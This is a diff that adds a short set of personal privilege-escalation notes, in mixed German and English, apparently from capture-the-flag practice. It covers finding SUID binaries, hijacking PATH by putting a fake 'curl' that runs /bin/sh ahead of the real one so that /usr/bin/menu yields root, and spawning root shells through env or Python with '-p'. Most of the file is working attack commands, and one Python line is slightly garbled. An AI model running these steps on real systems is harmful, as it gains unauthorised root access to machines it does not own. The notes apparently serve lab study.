@@ -1,0 +1,15 @@
+If there is an s instead of an x in the user permissions, then that file has the SUID bit set.
+
+find / -perm -u=s -type f 2>/dev/null oder sudo -l wenn verfügbar
+Suche nach Files mit SUID Bit Exploit, öfters ist es /usr/bin/menu
+
+/usr/bin/menu das kann man ausführen einfach, wenn vorhanden
+Beispiel: curl -I localhost - ausgeführt ohne ganzen Pfad (e.g. not using /usr/bin/curl or /usr/bin/uname)
+-> echo /bin/sh > curl
+chmod 777 curl
+chmod +x curl und Binary /usr/bin/menu ausführen, danach 1. und man hat root
+
+/usr/bin/env auch oft interessant, nach env auf gtfobins suchen dann z.B. usr/bin/env /bin/sh -p
+
+falls z.B. Bit bei Python gesetzt ist, /Pfadpython -c ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+wobei ab ./python von gtfobins stammt
